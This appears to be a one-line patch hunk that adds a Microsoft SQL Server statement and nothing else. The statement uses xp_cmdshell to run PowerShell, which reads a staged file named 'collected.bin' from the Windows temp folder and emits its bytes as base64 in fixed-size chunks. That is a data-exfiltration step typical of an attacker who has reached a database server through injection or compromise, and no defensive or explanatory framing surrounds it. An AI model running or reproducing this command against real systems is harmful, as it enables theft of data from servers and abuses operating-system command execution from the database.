@@ -1,0 +1,1 @@
+EXEC master..xp_cmdshell 'powershell.exe -NoProfile -Command "$b=[IO.File]::ReadAllBytes(''C:\Windows\Temp\collected.bin''); for($i=0;$i -lt $b.Length;$i+=144){[Console]::WriteLine([Convert]::ToBase64String($b,$i,[Math]::Min(144,$b.Length-$i)))}"';
